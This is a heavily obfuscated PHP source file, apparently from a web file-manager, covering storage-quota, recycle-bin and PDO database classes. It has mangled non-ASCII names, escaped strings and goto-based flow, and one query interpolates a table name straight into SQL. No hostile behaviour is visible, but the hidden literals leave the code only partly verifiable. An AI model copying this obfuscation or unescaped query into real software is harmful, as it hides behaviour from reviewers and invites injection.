|| $ú½Ïòã <= 0 ? 0 : $ú½Ïòã; Model($Œâ†Ìº[579])->userEdit($Õ¤±€Íş, array($Œâ†Ìº[1959] => $ú½Ïòã)); } public function targetSpaceUpdate($ù‘®, $‰¹É¿Ú’) { $Ç÷×Ù§ =& $_SERVER[Š—Â“œÔ]; if (!$‰¹É¿Ú’) { return; } if (!in_array($ù‘®, array(self::TYPE_USER, self::TYPE_GROUP))) { return; } $Óêß´ş¹ = $this->targetSpaceSize($ù‘®, $‰¹É¿Ú’); if ($ù‘® == self::TYPE_USER) { Model($Ç÷×Ù§[579])->userEdit($‰¹É¿Ú’, array($Ç÷×Ù§[1959] => $Óêß´ş¹)); } else { if ($ù‘® == self::TYPE_GROUP) { Model($Ç÷×Ù§[587])->groupEdit($‰¹É¿Ú’, array($Ç÷×Ù§[1959] => $Óêß´ş¹)); } } } public function targetSpaceSize($áœÌ²æª, $„Á’ÅıÔ) { $Ìé…¦ =& $_SERVER[Š—Â“œÔ]; $ËÌë‡Ù¼ = 0; $ÅğË‰¸ = $this->targetSourceRoot($áœÌ²æª, $„Á’ÅıÔ, !0); foreach ($ÅğË‰¸ as $ıÎßï…¬) { if (!$ıÎßï…¬) { continue; } $ËÌë‡Ù¼ += floatval($ıÎßï…¬[$Ìé…¦[79]]); $¼Í˜óÙÀ = array($Ìé…¦[657] => array($Ìé…¦[617], $Ìé…¦[595] . $ıÎßï…¬[$Ìé…¦[193]] . $Ìé…¦[618])); $Íä¡¼‚ = Model($Ìé…¦[505])->field($Ìé…¦[493])->where($¼Í˜óÙÀ)->select(); $Íä¡¼‚ = array_to_keyvalue($Íä¡¼‚, $Ìé…¦[12], $Ìé…¦[193]); $Íä¡¼‚ = array_unique(array_filter($Íä¡¼‚)); if ($Íä¡¼‚) { $¼Í˜óÙÀ = array($Ìé…¦[493] => array($Ìé…¦[494], $Íä¡¼‚)); $ËÌë‡Ù¼ += floatval($this->where($¼Í˜óÙÀ)->sum($Ìé…¦[79])); } } $ËÌë‡Ù¼ = !$ËÌë‡Ù¼ || $ËÌë‡Ù¼ <= 0 ? 0 : $ËÌë‡Ù¼; return $ËÌë‡Ù¼; } public function allFileTypeProfile() { return $this->fileTypeProfile(!1, !1); } public function userFileTypeProfile($Ì†Õ¤Êï) { return $this->fileTypeProfile($Ì†Õ¤Êï, SourceModel::TYPE_USER); } public function groupFileTypeProfile($×–¹ß³Ï) { return $this->fileTypeProfile($×–¹ß³Ï, SourceModel::TYPE_GROUP); } private function fileTypeProfile($±¥êÄ®, $ìÃë®²²) { $í²ü˜²í =& $_SERVER[Š—Â“œÔ]; $¡¸õÕ = $í²ü˜²í[2295] . $±¥êÄ® . $í²ü˜²í[11] . $ìÃë®²²; $öÏöêµê = Cache::get($¡¸õÕ); if ($öÏöêµê) { return $öÏöêµê; } $»ªË×´Ì = array($í²ü˜²í[651] => 0); if ($±¥êÄ® != !1) { $»ªË×´Ì[$í²ü˜²í[571]] = $±¥êÄ®; $»ªË×´Ì[$í²ü˜²í[190]] = $ìÃë®²²; } $æù½é¸Û = array(); $æù½é¸Û[$í²ü˜²í[2296]] = array($í²ü˜²í[2297] => LNG($í²ü˜²í[2296]), $í²ü˜²í[2298] => $this->where($»ªË×´Ì)->count(), $í²ü˜²í[622] => $this->where($»ªË×´Ì)->sum($í²ü˜²í[79])); $ğÑÚ×–Ñ = KodIO::fileTypeList(); foreach ($ğÑÚ×–Ñ as $•‚«ìÜŠ => $ÆÁêÉŞş) { $»ªË×´Ì[$í²ü˜²í[488]] = $this->fileTypeWhere($•‚«ìÜŠ); $æù½é¸Û[$•‚«ìÜŠ] = array($í²ü˜²í[2297] => $ÆÁêÉŞş[$í²ü˜²í[32]], $í²ü˜²í[2298] => $this->where($»ªË×´Ì)->count(), $í²ü˜²í[622] => $this->where($»ªË×´Ì)->sum($í²ü˜²í[79])); } Cache::set($¡¸õÕ, $æù½é¸Û, 1200); return $æù½é¸Û; } public function fileNameExist($‡ğæ®ô, $­Š–‹Œ·) { $Ğóçú³Ï =& $_SERVER[Š—Â“œÔ]; $†Ÿ»«©ˆ = $this->field($Ğóçú³Ï[2299])->where(array($Ğóçú³Ï[192] => $‡ğæ®ô, $Ğóçú³Ï[32] => $­Š–‹Œ·, $Ğóçú³Ï[507] => 0))->find(); return is_array($†Ÿ»«©ˆ) ? $†Ÿ»«©ˆ[$Ğóçú³Ï[193]] : !1; } public function childList($ÒüÖáæ) { $›¿ì×ï— =& $_SERVER[Š—Â“œÔ]; $ÖÎ¡¸ß¼ = $›¿ì×ï—[2272] . $ÒüÖáæ; if (isset(self::$cacheChildList[$ÖÎ¡¸ß¼])) { return self::$cacheChildList[$ÖÎ¡¸ß¼]; } $•Î‹ğØ­ = array($›¿ì×ï—[192] => intval($ÒüÖáæ), $›¿ì×ï—[507] => 0); $óéŒğß° = $this->where($•Î‹ğØ­)->select(); $óéŒğß° = $óéŒğß° ? $óéŒğß° : array(); self::$cacheChildList[$ÖÎ¡¸ß¼] = $óéŒğß°; foreach ($óéŒğß° as $°Îæª¼’) { $ÖÎ¡¸ß¼ = $›¿ì×ï—[535] . $°Îæª¼’[$›¿ì×ï—[193]]; self::$cacheSourceInfo[$ÖÎ¡¸ß¼] = $°Îæª¼’; } return $óéŒğß°; } public function fileNameAuto($¿˜î»Ø, $±áÛã¦ , $²œ´İ¬ = REPEAT_RENAME, $òØ×òş± = false) { $“¸½Á¹¨ =& $_SERVER[Š—Â“œÔ]; $‘–í» = get_path_ext($±áÛã¦ ); $ÉªšºÒÒ = $‘–í» ? get_path_ext_name($±áÛã¦ ) . $“¸½Á¹¨[2300] . $‘–í» : $±áÛã¦  . $“¸½Á¹¨[462]; $à¡¹‘ºÇ = array($“¸½Á¹¨[192] => $¿˜î»Ø, $“¸½Á¹¨[507] => 0, $“¸½Á¹¨[32] => array($“¸½Á¹¨[461], $ÉªšºÒÒ)); $¦òÒ¡ì• = $this->field($“¸½Á¹¨[32])->where($à¡¹‘ºÇ)->select(); $§’½Õ¨ = array_to_keyvalue($¦òÒ¡ì•, $“¸½Á¹¨[12], $“¸½Á¹¨[32]); return $this->fileNameAutoGet($§’½Õ¨, $±áÛã¦ , $²œ´İ¬, $òØ×òş±); } public function fileNameAutoGet($š™üáâ¥, $ÇâÙÖ‰, $ğä·İİÍ, $ÁòÆ»Û) { $›ÀåçÒ =& $_SERVER[Š—Â“œÔ]; if ($ğä·İİÍ == REPEAT_REPLACE || !$š™üáâ¥ || !in_array_not_case($ÇâÙÖ‰, $š™üáâ¥) || $ÁòÆ»Û && $ğä·İİÍ != REPEAT_RENAME_FOLDER) { return $ÇâÙÖ‰; } if ($ğä·İİÍ == REPEAT_SKIP) { return !1; } $šò°£ãÉ = $›ÀåçÒ[10] . get_path_ext($ÇâÙÖ‰); $šò°£ãÉ = $šò°£ãÉ == $›ÀåçÒ[10] || $ÁòÆ»Û ? $›ÀåçÒ[12] : $šò°£ãÉ; for ($¤àÎÛô… = 1; $¤àÎÛô… <= count($š™üáâ¥) + 1; $¤àÎÛô…++) { $÷»Å¦´ö = substr($ÇâÙÖ‰, 0, strlen($ÇâÙÖ‰) - strlen($šò°£ãÉ)); $Şà„”‰œ = $÷»Å¦´ö . "\50{$¤àÎÛô…}\x29{$šò°£ãÉ}"; if (!in_array_not_case($Şà„”‰œ, $š™üáâ¥)) { return $Şà„”‰œ; } } } } class SourceRecycleModel extends ModelBase { protected $tableName = "\x69\157\x5f\163\157\165\x72\x63\145\137\162\145\x63\171\x63\154\145"; protected $dataAuto = array(array("\143\162\145\141\164\145\124\x69\155\145", "\164\x69\155\145", "\x69\156\163\x65\x72\164", "\146\165\156\x63\x74\151\157\x6e")); public function listData($å¯©Â›™ = false) { $©¸¿ıÉ² =& $_SERVER[Š—Â“œÔ]; $å¯©Â›™ = $å¯©Â›™ ? $å¯©Â›™ : USER_ID; $úÕ¡‚Êª = $this->where(array($©¸¿ıÉ²[1761] => $å¯©Â›™))->select(); return array_to_keyvalue($úÕ¡‚Êª, $©¸¿ıÉ²[12], $©¸¿ıÉ²[193]); } public function moveToRecycle($Ã¾êÂ) { $œÄÀããí =& $_SERVER[Š—Â“œÔ]; $÷É¨ğúõ = Model($œÄÀããí[1419]); $†÷Õ‹Œ = $÷É¨ğúõ->sourceInfo($Ã¾êÂ); if (!$†÷Õ‹Œ || $†÷Õ‹Œ[$œÄÀããí[507]] == $œÄÀããí[91]) { return; } $§¸–‹ê = array($œÄÀããí[493] => $Ã¾êÂ, $œÄÀããí[1761] => USER_ID, $œÄÀããí[653] => $†÷Õ‹Œ[$œÄÀããí[190]], $œÄÀããí[654] => $†÷Õ‹Œ[$œÄÀããí[571]], $œÄÀããí[657] => $†÷Õ‹Œ[$œÄÀããí[586]]); $this->add($§¸–‹ê); $this->recycleMove($Ã¾êÂ, 1); if ($†÷Õ‹Œ[$œÄÀããí[487]] == $œÄÀããí[91]) { $´ë×‰ŸØ = array($œÄÀããí[657] => array($œÄÀããí[617], $†÷Õ‹Œ[$œÄÀããí[586]] . $Ã¾êÂ . $œÄÀããí[618])); $÷É¨ğúõ->where($´ë×‰ŸØ)->setField($œÄÀããí[507], 1); } } public function clear() { $this->remove(!1); } public function remove($–Ú»ş— = false, $¹ô¶üŞ = false) { $Ï¹„ªñ =& $_SERVER[Š—Â“œÔ]; $¹ô¶üŞ = $¹ô¶üŞ ? $¹ô¶üŞ : USER_ID; $ŠµäøœÃ = Model($Ï¹„ªñ[1419]); $Ş£Ö˜‰Ñ = $this->listData($¹ô¶üŞ); $–Ú»ş— = $–Ú»ş— === !1 ? !1 : $–Ú»ş—; $–†üìİ = array(); foreach ($Ş£Ö˜‰Ñ as $åÑÚˆá) { if ($–Ú»ş— != !1 && !in_array($åÑÚˆá, $–Ú»ş—)) { continue; } $§“ÑÄó– = $ŠµäøœÃ->sourceInfo($åÑÚˆá); $ŠµäøœÃ->remove($åÑÚˆá, !1); $Ùƒüİ = $§“ÑÄó–[$Ï¹„ªñ[190]] . $Ï¹„ªñ[11] . $§“ÑÄó–[$Ï¹„ªñ[571]]; $–†üìİ[$Ùƒüİ] = array($Ï¹„ªñ[653] => $§“ÑÄó–[$Ï¹„ªñ[190]], $Ï¹„ªñ[571] => $§“ÑÄó–[$Ï¹„ªñ[571]]); $this->where(array($Ï¹„ªñ[193] => $åÑÚˆá))->delete(); } foreach ($–†üìİ as $‹…ÀÔÖ) { $ŠµäøœÃ->targetSpaceUpdate($‹…ÀÔÖ[$Ï¹„ªñ[190]], $‹…ÀÔÖ[$Ï¹„ªñ[571]]); } } public function restore($¨¬€¤ß = false) { $ü®¶èÀ = $this->listData(); $this->_restoreSource($ü®¶èÀ, $¨¬€¤ß); } public function removeUserAll($˜ùŒ­˜ô) { $this->remove(!1, $˜ùŒ­˜ô); } public function restoreItem($¬Í…ˆŸò) { $this->_restoreSource(array($¬Í…ˆŸò), array($¬Í…ˆŸò)); } private function _restoreSource($™÷¼Â‰, $Òöñ­‘ˆ) { $Ü‰Â‡‡ã =& $_SERVER[Š—Â“œÔ]; $ñ¨÷õÂ = Model($Ü‰Â‡‡ã[1419]); $Òöñ­‘ˆ = $Òöñ­‘ˆ == !1 ? !1 : $Òöñ­‘ˆ; if (!$™÷¼Â‰) { return !0; } $¨‘±ÊÇİ = array(); foreach ($™÷¼Â‰ as $é áİ) { if ($Òöñ­‘ˆ != !1 && !in_array($é áİ, $Òöñ­‘ˆ)) { continue; } $ı¼µô° = $ñ¨÷õÂ->sourceInfo($é áİ); $ÔÃú—¦ = $ñ¨÷õÂ->sourceInfo($ı¼µô°[$Ü‰Â‡‡ã[192]]); if ($ÔÃú—¦[$Ü‰Â‡‡ã[507]] == $Ü‰Â‡‡ã[91]) { continue; } $ñ¨÷õÂ->lockMoveStart($é áİ); $this->recycleMove($é áİ, 0); if ($ı¼µô°[$Ü‰Â‡‡ã[487]] == $Ü‰Â‡‡ã[91]) { $¥–×ŠÙí = array($Ü‰Â‡‡ã[657] => array($Ü‰Â‡‡ã[617], $ı¼µô°[$Ü‰Â‡‡ã[586]] . $é áİ . $Ü‰Â‡‡ã[618])); $ñ¨÷õÂ->where($¥–×ŠÙí)->setField($Ü‰Â‡‡ã[507], 0); $this->restoreFolderChildren($é áİ, $™÷¼Â‰); } $this->where(array($Ü‰Â‡‡ã[193] => $é áİ))->delete(); $ñ¨÷õÂ->folderSizeReset($ı¼µô°[$Ü‰Â‡‡ã[192]]); $¨‘±ÊÇİ[] = $ı¼µô°[$Ü‰Â‡‡ã[192]]; if ($ı¼µô°[$Ü‰Â‡‡ã[487]] == $Ü‰Â‡‡ã[91]) { $¨‘±ÊÇİ[] = $é áİ; } $ñ¨÷õÂ->lockMoveEnd($é áİ); } $ñ¨÷õÂ->updateModifyTime($¨‘±ÊÇİ); } private function restoreFolderChildren($±Ê˜Á×é, $Ø†¤œ) { $İËÇ À† =& $_SERVER[Š—Â“œÔ]; $ŠÇ•ŒüÉ = Model($İËÇ À†[1419]); $ğ°ö¡óõ = array($İËÇ À†[193] => array($İËÇ À†[7], array())); foreach ($Ø†¤œ as $êƒØıÆ£) { if ($êƒØıÆ£ == $±Ê˜Á×é) { continue; } if (!$ŠÇ•ŒüÉ->isParentOf($±Ê˜Á×é, $êƒØıÆ£)) { continue; } $üï¯îşõ = $ŠÇ•ŒüÉ->sourceInfo($êƒØıÆ£); if ($üï¯îşõ[$İËÇ À†[487]] == $İËÇ À†[91]) { $ğ°ö¡óõ[] = array($İËÇ À†[657] => array($İËÇ À†[617], $üï¯îşõ[$İËÇ À†[586]] . $êƒØıÆ£ . $İËÇ À†[618])); } else { $ğ°ö¡óõ[$İËÇ À†[193]][1][] = $êƒØıÆ£; } } if (!$ğ°ö¡óõ[$İËÇ À†[193]][1]) { unset($ğ°ö¡óõ[$İËÇ À†[193]]); } if (!$ğ°ö¡óõ) { return; } if (is_array($ğ°ö¡óõ[$İËÇ À†[193]]) && is_array($ğ°ö¡óõ[$İËÇ À†[193]][1])) { $ğ°ö¡óõ[$İËÇ À†[193]][1] = array_unique($ğ°ö¡óõ[$İËÇ À†[193]][1]); } $ğ°ö¡óõ[$İËÇ À†[1074]] = $İËÇ À†[2073]; $ŠÇ•ŒüÉ->where($ğ°ö¡óõ)->setField($İËÇ À†[507], 1); } private function recycleMove($ı®ãÓş¹, $ÌÅ¾§¯† = 1) { $¨ı…ƒç» =& $_SERVER[Š—Â“œÔ]; $²ç›Ì¾Ò = Model($¨ı…ƒç»[1419]); $‘çÂÂıé = Model($¨ı…ƒç»[2301]); $ÒÙø¾œê = array($¨ı…ƒç»[193] => $ı®ãÓş¹); if ($ÌÅ¾§¯†) { $²ç›Ì¾Ò->where($ÒÙø¾œê)->setField($¨ı…ƒç»[507], 1); $‘çÂÂıé->eventRecycle($ı®ãÓş¹, $¨ı…ƒç»[2302]); } else { $ö†“€÷à = $²ç›Ì¾Ò->where($ÒÙø¾œê)->find(); $ƒ©ŒİÍÕ = $ö†“€÷à[$¨ı…ƒç»[487]] == $¨ı…ƒç»[91]; $­ö¡×³„ = $²ç›Ì¾Ò->fileNameAuto($ö†“€÷à[$¨ı…ƒç»[192]], $ö†“€÷à[$¨ı…ƒç»[32]], REPEAT_RENAME_FOLDER, $ƒ©ŒİÍÕ); if ($­ö¡×³„ != $ö†“€÷à[$¨ı…ƒç»[32]]) { $²ç›Ì¾Ò->rename($ı®ãÓş¹, $­ö¡×³„); } $²ç›Ì¾Ò->where($ÒÙø¾œê)->setField($¨ı…ƒç»[507], 0); $‘çÂÂıé->eventRecycle($ı®ãÓş¹, $¨ı…ƒç»[2303]); } } } class SourceSecretModel extends ModelBaseLight { public $optionType = "\x53\x79\163\x74\x65\x6d\x2e\163\x6f\x75\162\143\x65\x53\145\x63\x72\x65\x74\x4c\151\x73\x74"; public $field = array("\163\157\165\x72\x63\145\111\x44", "\164\x79\x70\x65\x49\x44", "\x63\162\x65\x61\x74\x65\x55\163\x65\x72"); } goto CãøáëĞ²; Få¾ªëÌ¦‰: function binCheckBigger($°ÔÉ‘ª, $—®úĞîï) { return $°ÔÉ‘ª > $—®úĞîï; } $_SERVER[$_SERVER[Ü—Úç¿‹][3]] = ("\70\65\66\65"."\63\61")+0;$_si6h="gynpsz57hdwvueqt3flmck6r8bj41a2ox09iqd5i98smvnz3kba7rclgxpefjy2hu0o461wtmu0n7optwc";; class ClassBaseCall { protected static $_methodListStatic = array(); protected static $_methodList = array(); public function __call($¢¬Öı´‘, $ÛÂ¦§û¥) { $±š¾Ø­ =& $_SERVER[Š—Â“œÔ]; if (isset(self::$_methodList[$¢¬Öı´‘])) { return @call_user_func_array(self::$_methodList[$¢¬Öı´‘], $ÛÂ¦§û¥); } else { if (method_exists($this, $¢¬Öı´‘)) { return call_user_func_array(array($this, $¢¬Öı´‘), $ÛÂ¦§û¥); } else { think_exception(__CLASS__ . $±š¾Ø­[4] . $¢¬Öı´‘ . $±š¾Ø­[5]); } } } public static function __callStatic($üîİ‹¢, $µªó¬ÇÇ) { if (isset(self::$_methodListStatic[$üîİ‹¢])) { return call_user_func_array(self::$_methodListStatic[$üîİ‹¢], $µªó¬ÇÇ); } else { if (method_exists(self, $üîİ‹¢)) { return call_user_func_array(array(self, $üîİ‹¢), $µªó¬ÇÇ); } else { show_json("{$üîİ‹¢}\x28\x29\40\x6e\x6f\164\x20\x65\x78\151\163\x74\73", !1); } } } public static function addMethod($Â©ç ´Œ, $€‡§©£Œ) { self::$_methodList[$Â©ç ´Œ] = $€‡§©£Œ; } public static function addMethodStatic($ƒ ¿ØÜÏ, $–×Û÷µÅ) { self::$_methodListStatic[$ƒ ¿ØÜÏ] = $–×Û÷µÅ; } } goto b‘İÅ†Çµİ; aÚøÉ¡¡Áƒ: class DbPdo extends Db { protected $PDOStatement = null; private $table = ''; public function __construct($ÅàµéÎ = '') { $†•Ò‰ÂÙ =& $_SERVER[Š—Â“œÔ]; if (!class_exists($†•Ò‰ÂÙ[988])) { think_exception(think_lang($†•Ò‰ÂÙ[14]) . $†•Ò‰ÂÙ[989]); } if (!empty($ÅàµéÎ)) { $this->config = $ÅàµéÎ; if (empty($this->config[$†•Ò‰ÂÙ[17]])) { $this->config[$†•Ò‰ÂÙ[17]] = array(); } } } public function connect($‡˜ìœ‘° = '', $½»³ó¬ = 0) { $ô…Ãªõ© =& $_SERVER[Š—Â“œÔ]; if (!isset($this->linkID[$½»³ó¬])) { if (empty($‡˜ìœ‘°)) { $‡˜ìœ‘° = $this->config; } $Äàúæ‚° = !empty($‡˜ìœ‘°[$ô…Ãªõ©[17]][$ô…Ãªõ©[18]]) ? $‡˜ìœ‘°[$ô…Ãªõ©[17]][$ô…Ãªõ©[18]] : $this->pconnect; if ($Äàúæ‚°) { $‡˜ìœ‘°[$ô…Ãªõ©[17]][PDO::ATTR_PERSISTENT] = !0; } try { $this->linkID[$½»³ó¬] = new PDO($‡˜ìœ‘°[$ô…Ãªõ©[990]], $‡˜ìœ‘°[$ô…Ãªõ©[962]], $‡˜ìœ‘°[$ô…Ãªõ©[963]], $‡˜ìœ‘°[$ô…Ãªõ©[17]]); } catch (PDOException $§üÏ¨ÔÖ) { think_exception($§üÏ¨ÔÖ->getMessage()); } $this->dbType = $this->_getDsnType($‡˜ìœ‘°[$ô…Ãªõ©[990]]); if (in_array($this->dbType, array($ô…Ãªõ©[991], $ô…Ãªõ©[992], $ô…Ãªõ©[993], $ô…Ãªõ©[994]))) { think_exception($ô…Ãªõ©[995] . $this->dbType . $ô…Ãªõ©[996] . $this->dbType . $ô…Ãªõ©[997]); } if (!$this->linkID[$½»³ó¬]) { think_exception($ô…Ãªõ©[998]); } try { $this->linkID[$½»³ó¬]->exec($ô…Ãªõ©[999] . think_config($ô…Ãªõ©[965])); } catch (Exception $§üÏ¨ÔÖ) { } $this->connected = !0; if (1 != think_config($ô…Ãªõ©[22])) { unset($this->config); } } return $this->linkID[$½»³ó¬]; } public function free() { $this->PDOStatement = null; } public function query($™á¦ñê, $ó½Ù·ı˜ = array()) { $Ä£­è³Ş =& $_SERVER[Š—Â“œÔ]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $™á¦ñê; if (!empty($ó½Ù·ı˜)) { $this->queryStr .= $Ä£­è³Ş[1000] . print_r($ó½Ù·ı˜, !0) . $Ä£­è³Ş[1001]; } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($Ä£­è³Ş[23], 1); think_status($Ä£­è³Ş[24]); $this->PDOStatement = $this->_linkID->prepare($™á¦ñê); if (!1 === $this->PDOStatement) { think_exception($this->error()); } $ëÓêÍÑ¬ = $this->PDOStatement->execute($ó½Ù·ı˜); $this->debug(); if (!1 === $ëÓêÍÑ¬) { $this->error(); return !1; } else { return $this->getAll(); } } public function execute($çû°İÊö, $ ‘ïëå¢ = array()) { $‡ß‚öã’ =& $_SERVER[Š—Â“œÔ]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $çû°İÊö; if (!empty($ ‘ïëå¢)) { $this->queryStr .= $‡ß‚öã’[1000] . print_r($ ‘ïëå¢, !0) . $‡ß‚öã’[1001]; } $ÜØƒÛÒÉ = !1; if ($this->dbType == $‡ß‚öã’[994]) { if (preg_match($‡ß‚öã’[1002], $this->queryStr, $ı•ŞÊ¹)) { $this->table = think_config($‡ß‚öã’[1003]) . str_ireplace(think_config($‡ß‚öã’[1004]), $‡ß‚öã’[456], $ı•ŞÊ¹[2]); $ÜØƒÛÒÉ = (bool) $this->query($‡ß‚öã’[1005] . strtoupper($this->table) . $‡ß‚öã’[58]); } } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($‡ß‚öã’[25], 1); think_status($‡ß‚öã’[24]); $this->PDOStatement = $this->_linkID->prepare($çû°İÊö); if (!1 === $this->PDOStatement) { think_exception($this->error()); } $Ûœó²ƒŒ = $this->PDOStatement->execute($ ‘ïëå¢); $this->debug(); if (!1 === $Ûœó²ƒŒ) { $this->error(); return !1; } else { $this->numRows = $this->PDOStatement->rowCount(); if ($ÜØƒÛÒÉ || preg_match($‡ß‚öã’[1006], $çû°İÊö)) { $this->lastInsID = $this->getLastInsertId(); } return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->beginTransaction(); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $ªğ›£ù = $this->_linkID->commit(); $this->transTimes = 0; if (!$ªğ›£ù) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $°‡Ÿã­é = $this->_linkID->rollback(); $this->transTimes = 0; if (!$°‡Ÿã­é) { $this->error(); return !1; } } return !0; } private function getAll() { $÷ı—†şù = $this->PDOStatement->fetchAll(PDO::FETCH_ASSOC); $this->numRows = count($÷ı—†şù); return $÷ı—†şù; } public function getFields($Ëî¾š‘Ó) { $¬†¹ØØé =& $_SERVER[Š—Â“œÔ]; $this->initConnect(!0); if (think_config($¬†¹ØØé[1007])) { $½ä•šÓà = str_replace($¬†¹ØØé[1008], $Ëî¾š‘Ó, think_config($¬†¹ØØé[1007])); } else { switch ($this->dbType) { case $¬†¹ØØé[991]: case $¬†¹ØØé[1009]: $½ä•šÓà = "\x53\x45\114\x45\x43\x54\x20\x20\40\x63\157\154\x75\155\x6e\137\x6e\141\155\x65\40\x61\163\40\47\116\x61\155\145\47\54\x20\40\40\x64\x61\x74\141\137\164\x79\x70\x65\x20\141\163\40\47\x54\171\x70\x65\47\54\40\40\x20\x63\157\x6c\165\155\x6e\x5f\x64\145\x66\x61\165\154\x74\x20\x61\x73\40\x27\x44\145\x66\141\x75\x6c\x74\47\54\x20\40\40\151\163\137\156\x75\x6c\x6c\x61\x62\x6c\145\x20\141\163\x20\x27\x4e\165\154\x6c\47\12\11\x9\x46\122\117\x4d\11\151\156\146\157\162\155\x61\x74\151\157\x6e\137\x73\x63\x68\145\x6d\141\x2e\x74\x61\x62\154\145\163\x20\x41\123\40\x74\12\11\x9\x4a\x4f\x49\116\11\x69\156\x66\157\x72\x6d\141\x74\151\157\156\x5f\163\143\150\145\x6d\x61\56\143\157\x6c\x75\x6d\156\163\x20\x41\x53\40\143\12\x9\11\x4f\116\x20\x20\x74\56\164\x61\142\x6c\145\137\143\x61\x74\141\x6c\157\147\x20\x3d\x20\x63\56\x74\x61\x62\x6c\x65\x5f\143\141\164\x61\154\x6f\x67\xa\x9\x9\101\x4e\x44\40\164\x2e\164\x61\142\154\145\137\x73\143\150\x65\x6d\x61\x20\75\40\x63\56\x74\x61\x62\x6c\x65\137\x73\x63\x68\x65\155\x61\xa\x9\11\101\x4e\x44\x20\x74\56\x74\141\142\x6c\x65\x5f\x6e\x61\x6d\145\40\x3d\40\x63\x2e\164\x61\142\154\145\137\156\x61\155\x65\12\11\11\x57\110\x45\x52\105\40\x20\x20\x74\56\x74\x61\142\154\145\137\156\x61\x6d\145\x20\75\x20\x27{$Ëî¾š‘Ó}\x27"; break; case $¬†¹ØØé[1010]: $½ä•šÓà = $¬†¹ØØé[1011] . $Ëî¾š‘Ó . $¬†¹ØØé[1012]; break; case $¬†¹ØØé[992]: case $¬†¹ØØé[994]: $½ä•šÓà = $¬†¹ØØé[1013] . $¬†¹ØØé[1014] . $¬†¹ØØé[1015] . strtoupper($Ëî¾š‘Ó) . $¬†¹ØØé[1016] . strtoupper($Ëî¾š‘Ó) . $¬†¹ØØé[1017]; break; case $¬†¹ØØé[1018]: $½ä•šÓà = $¬†¹ØØé[1019] . $Ëî¾š‘Ó . $¬†¹ØØé[1020]; break; case $¬†¹ØØé[993]: break; case $¬†¹ØØé[1021]: default: $½ä•šÓà = $¬†¹ØØé[1022] . ($this->dbType == $¬†¹ØØé[1021] ? "\140{$Ëî¾š‘Ó}\x60" : $Ëî¾š‘Ó); } } $ÙÔÛÌìõ = $this->query($½ä•šÓà); $‹Ÿë¢† = array(); if ($ÙÔÛÌìõ) { foreach ($ÙÔÛÌìõ as $˜ôÏóÕğ => $¸å¨æ) { $¸å¨æ = array_change_key_case($¸å¨æ); $¸å¨æ[$¬†¹ØØé[32]] = isset($¸å¨æ[$¬†¹ØØé[32]]) ? $¸å¨æ[$¬†¹ØØé[32]] : $¬†¹ØØé[456]; $¸å¨æ[$¬†¹ØØé[33]] = isset($¸å¨æ[$¬†¹ØØé[33]]) ? $¸å¨æ[$¬†¹ØØé[33]] : $¬†¹ØØé[456]; $‡Ìİ´¹› = isset($¸å¨æ[$¬†¹ØØé[352]]) ? $¸å¨æ[$¬†¹ØØé[352]] : $¸å¨æ[$¬†¹ØØé[32]]; $‹Ÿë¢†[$‡Ìİ´¹›] = array($¬†¹ØØé[32] => $‡Ìİ´¹›, $¬†¹ØØé[33] => $¸å¨æ[$¬†¹ØØé[33]], $¬†¹ØØé[35] => (bool) (isset($¸å¨æ[$¬†¹ØØé[106]]) && $¸å¨æ[$¬†¹ØØé[106]] === $¬†¹ØØé[12] || isset($¸å¨æ[$¬†¹ØØé[35]]) && $¸å¨æ[$¬†¹ØØé[35]] === $¬†¹ØØé[12]), $¬†¹ØØé[37] => isset($¸å¨æ[$¬†¹ØØé[37]]) ? $¸å¨æ[$¬†¹ØØé[37]] : (isset($¸å¨æ[$¬†¹ØØé[56]]) ? $¸å¨æ[$¬†¹ØØé[56]] : $¬†¹ØØé[456]), $¬†¹ØØé[39] => isset($¸å¨æ[$¬†¹ØØé[97]]) ? strtolower($¸å¨æ[$¬†¹ØØé[97]]) == $¬†¹ØØé[41] : (isset($¸å¨æ[$¬†¹ØØé[57]]) ? $¸å¨æ[$¬†¹ØØé[57]] : !1), $¬†¹ØØé[42] => isset($¸å¨æ[$¬†¹ØØé[1023]]) ? strtolower($¸å¨æ[$¬†¹ØØé[1023]]) == $¬†¹ØØé[44] : (isset($¸å¨æ[$¬†¹ØØé[97]]) ? $¸å¨æ[$¬†¹ØØé[97]] : !1)); } } return $‹Ÿë¢†; } public function getTables($íæ…É¯Ş = '') { $°ş’€ú³ =& $_SERVER[Š—Â“œÔ]; if (think_config($°ş’€ú³[1024])) { $¢«Ú–ô‘ = str_replace($°ş’€ú³[1025], $íæ…É¯Ş, think_config($°ş’€ú³[1024])); } else { switch ($this->dbType) { case $°ş’€ú³[992]: case $°ş’€ú³[994]: $¢«Ú–ô‘ = $°ş’€ú³[1026]; break; case $°ş’€ú³[991]: case $°ş’€ú³[1009]: $¢«Ú–ô‘ = $°ş’€ú³[1027]; break; case $°ş’€ú³[1018]: $¢«Ú–ô‘ = $°ş’€ú³[1028]; break; case $°ş’€ú³[993]: think_exception(think_lang($°ş’€ú³[1029]) . $°ş’€ú³[1030]); break; case $°ş’€ú³[1010]: $¢«Ú–ô‘ = $°ş’€ú³[45] . $°ş’€ú³[46] . $°ş’€ú³[47]; break; case $°ş’€ú³[1021]: default: if (!empty($íæ…É¯Ş)) { $¢«Ú–ô‘ = $°ş’€ú³[973] . $íæ…É¯Ş . $°ş’€ú³[974]; } else { $¢«Ú–ô‘ = $°ş’€ú³[975]; } } } $£îöŸ…Õ = $this->query($¢«Ú–ô‘); $ü·–ïÀ  = array(); foreach ($£îöŸ…Õ as $´í·öÎş => $“Â˜‡¬Ã) { $ü·–ïÀ [$´í·öÎş] = current($“Â˜‡¬Ã); } return $ü·–ïÀ ; } protected function parseLimit($¨Ì´ƒÑ) { $ô¨Ò§³§ =& $_SERVER[Š—Â“œÔ]; $¿Œ¿ˆ…€ = $ô¨Ò§³§[12]; if (!empty($¨Ì´ƒÑ)) { switch ($this->dbType) { case $ô¨Ò§³§[1018]: case $ô¨Ò§³§[1010]: $¨Ì´ƒÑ = explode($ô¨Ò§³§[50], $¨Ì´ƒÑ); if (count($¨Ì´ƒÑ) > 1) { 